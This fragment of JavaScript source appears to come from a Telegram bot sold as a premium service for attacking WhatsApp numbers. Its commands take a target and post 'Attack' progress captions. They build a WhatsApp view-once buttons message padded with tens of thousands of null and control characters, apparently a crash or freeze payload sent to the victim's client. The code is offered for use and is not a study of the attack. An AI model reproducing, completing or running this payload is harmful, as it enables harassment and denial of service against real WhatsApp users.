...
bot.command("nothing", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  ...
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
    caption: `
<blockquote><b>𖤓〘 𝐙𝐨𝐫𝐨 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
𖤓 Target:  ${q}
𖤓 Type: Force Invisible
𖤓 Status: Process
<blockquote><b>𖤓〘 𝐙𝐎𝐑𝐎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 〙𖤓</b></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
...
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      ...
      const processMsg = await ctx.telegram.sendPhoto(
        ...
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
⌑ Target: ${q}
⌑ Type: TEST FUNCTION
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
      ...
      const finalText = `<blockquote><pre>⟡━⟢ ZORO ⟣━⟡
⌑ Target: ${q}
⌑ Type: TEST FUNCTION
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
    ...
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "🩸\u0000\u0000\u0000\u0000🎀",
                    contentText: "Y A H A D A M B A P E" + "\u0000".repeat(50000),
                    footerText: "ditx",
                    buttons: [
                        {
                            buttonId: ".immpossible",
                            buttonText: {
                                displayText: "M B A P E" + "\x10".repeat(10000)
                            },
                            type: 1
                        }
                    ],
